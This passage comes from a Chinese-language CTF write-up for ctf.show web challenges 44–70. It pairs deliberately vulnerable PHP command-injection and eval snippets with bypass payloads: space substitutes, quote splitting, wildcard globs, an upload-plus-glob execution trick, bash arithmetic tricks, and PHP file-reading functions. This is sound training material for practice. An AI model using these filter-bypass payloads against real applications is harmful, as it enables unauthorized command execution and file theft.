class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了flag还有cat</p>
<p>用sort fla*</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">文件读取的方式：</span><br><span class="line">cat--由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac--从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more-- 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head-- 只显示头几行</span><br><span class="line">tail --只显示最后几行</span><br><span class="line">nl --类似于cat -n，显示时输出行号</span><br><span class="line">tailf-- 类似于tail -f</span><br><span class="line">vim --使用vim工具打开文本</span><br><span class="line">vi --使用vi打开文本cat 由第一行开始显示内容，并将所有内容输出</span><br></pre></td></tr></table></figure>





<h3 id="web-45"><a href="#web-45" class="headerlink" title="web 45"></a>web 45</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了空格</p>
<p>空格用%09代替即可绕过</p>
<h3 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a>web 46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了$符号以及*还有数字</p>
<p>%09会进行二次编码所以不用担心数字过滤</p>
<p>还有别的绕过方法如${IFS}但是这里过滤了$符号</p>
<p><code>&lt;&gt;,&lt;,$IF$9</code>但在这里好像都不行</p>
<h3 id="web-47"><a href="#web-47" class="headerlink" title="web 47"></a>web 47</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>more less head sort tail</code></p>
<p>可以用tac，具体其他命令44写了</p>
<h3 id="web-48"><a href="#web-48" class="headerlink" title="web 48"></a>web 48</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了<code>sed cut awk strings od curl</code></p>
<p>无影响</p>
<h3 id="web-49"><a href="#web-49" class="headerlink" title="web 49"></a>web 49</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了%用&lt;绕过</p>
<p><code>?c=tac&lt;fla&quot;&quot;g.php||</code></p>
<h3 id="web-50"><a href="#web-50" class="headerlink" title="web 50"></a>web 50</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了tab还有&amp;</p>
<p>一样绕</p>
<h3 id="web-51"><a href="#web-51" class="headerlink" title="web 51"></a>web 51</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tac也过滤了但是nl没有过滤</p>
<p>替换成nl，vi都行</p>
<h3 id="web-52"><a href="#web-52" class="headerlink" title="web 52"></a>web 52</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在<code>&lt;&gt;</code>也被过滤了但是$符号又放出来了</p>
<p>不过这题的flag在根目录下</p>
<h3 id="web-53"><a href="#web-53" class="headerlink" title="web 53"></a>web 53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多过滤了wget</p>
<p>直接执行系统命令</p>
<p>payload</p>
<p><code>c=nl$&#123;IFS&#125;fla&quot;&quot;g.php</code></p>
<h3 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>;|cat|flag| |[0-9]|\ |more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|nl|scp|rm</code></p>
<p>被过滤的参数</p>
<p>不能出现相连字母，所以flag.php可以用？代替f???????</p>
<p>最后vi输出或者是/bin/后面接过滤参数bin是命令目录</p>
<h3 id="web-55"><a href="#web-55" class="headerlink" title="web 55"></a>web 55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了所有小写字母</p>
<p>这里需要构造上传，更改一下上传脚本，并且构造poc执行命令</p>
<p><code>?c=.+/???/????????[@-[]</code></p>
<p>[@-[]是linux下面的通配符，匹配的是大写字母</p>
<p>然后在上传文件里面更改添加sh命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">！/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>就可以直接执行命令。</p>
<p>附构造上传脚本：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="web-56"><a href="#web-56" class="headerlink" title="web 56"></a>web 56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了数字</p>
<p>也可以用上面的方法</p>
<h3 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    flag在<span class="number">36</span>.php中</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额外过滤了上面的方法</p>
<p>涉及到了linux的命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;_&#125; =<span class="string">&quot;&quot;</span> //返回上一次命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((<span class="variable">$&#123;_&#125;</span>))=0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">((~$((<span class="variable">$&#123;_&#125;</span>))))=-1</span></span><br><span class="line">payload：</span><br><span class="line"><span class="meta">$</span><span class="bash">((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~</span></span><br><span class="line"><span class="meta">$</span><span class="bash">(())))$((~$(())))$((~$(())))))))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>构成-36取反就好了</p>
<h3 id="web-58"><a href="#web-58" class="headerlink" title="web 58"></a>web 58</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">突破禁用命令的方法：</span><br><span class="line">1、通过复制，重命名读取php文件内容		函数：copy、rename</span><br><span class="line">2、单一函数读文件内容：			  函数：file_get_contents()[搭配echo]		readfile()  	file()[搭配peint_r]</span><br><span class="line">3、通过fopen读文件内容：				</span><br><span class="line">函数：</span><br><span class="line">fread()		用法：$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);          </span><br><span class="line">fgets()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;</span><br><span class="line">fgetc()			 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetc($a);echo $line;&#125;</span><br><span class="line">fgetss()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetss($a);echo $line;&#125;//php7.3后无法使用</span><br><span class="line">fgetcsv()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgetcsv($a);print_r($line);&#125;</span><br><span class="line">gpassthru()		 $a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a); </span><br><span class="line">4、高亮：		函数：	show_source()	highlight_file()</span><br><span class="line">5、flag不在flag.php中，遍历目录：		函数：		scandir() 	opendir()</span><br><span class="line">6、flag是txt直接包含：		函数： 	include()		require()</span><br><span class="line">7、绕过之前的正则：在后面接exit();</span><br><span class="line">8、绕过open_basedir：   函数：</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是禁用了system好像，可以用highlight_file()绕过</p>
<p>也可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">readfile(&quot;flag.php&quot;);        </span><br></pre></td></tr></table></figure>



<h3 id="web-59"><a href="#web-59" class="headerlink" title="web 59"></a>web 59</h3><p>同样的数据</p>
<p>也没有过滤highlight_file()</p>
<p>也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br></pre></td></tr></table></figure>

<h3 id="web-60"><a href="#web-60" class="headerlink" title="web 60"></a>web 60</h3><p>见web58</p>
<p>也可以<code>（rename）copy(&quot;flag.php&quot;,&quot;flag.txt&quot;)</code>访问</p>
<h3 id="web-61-65"><a href="#web-61-65" class="headerlink" title="web 61-65"></a>web 61-65</h3><p>高亮</p>
<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><p>使用高亮发现flag不在这里，使用目录遍历</p>
<p><code>print_r(scandir(&#39;.&#39;));</code></p>
<p>发现flag在根目录下的flag.txt中</p>
<p>然后用高亮显示</p>
<p><code>c=highlight_file(&#39;/flag.txt&#39;);</code></p>
<h3 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h3><p><code>print_r</code>被禁，用var_dump代替</p>
<h3 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h3><p>发现高亮被过滤，但是可以继续遍历目录</p>
<p>flag还是在根目录下</p>
<p>因为他是txt文件，直接include这个文件他就会直接在网页中显示</p>
<h3 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69-70"></a>web 69-70</h3><p> <code>var_dump</code>被禁用,可以用<code>var_export</code>替代</p>
